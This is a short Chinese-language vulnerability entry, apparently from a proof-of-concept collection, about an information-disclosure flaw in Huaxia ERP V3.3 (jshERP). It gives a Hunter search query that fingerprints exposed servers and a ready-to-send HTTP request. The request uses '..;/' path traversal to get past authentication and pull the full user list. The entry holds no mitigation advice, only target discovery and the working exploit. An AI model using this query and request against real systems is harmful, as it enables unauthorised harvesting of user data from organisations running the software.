# 华夏ERPV3.3存在信息泄漏漏洞

华夏ERPV3.3存在信息泄漏漏洞，可获取用户敏感信息。

## hunter

```yaml
web.icon=="f6efcd53ba2b07d67ab993073c238a11"
```

## poc

```java
GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

```



## 漏洞来源

- https://mp.weixin.qq.com/s/c12Frd6hp0a3r8A9-lVr-g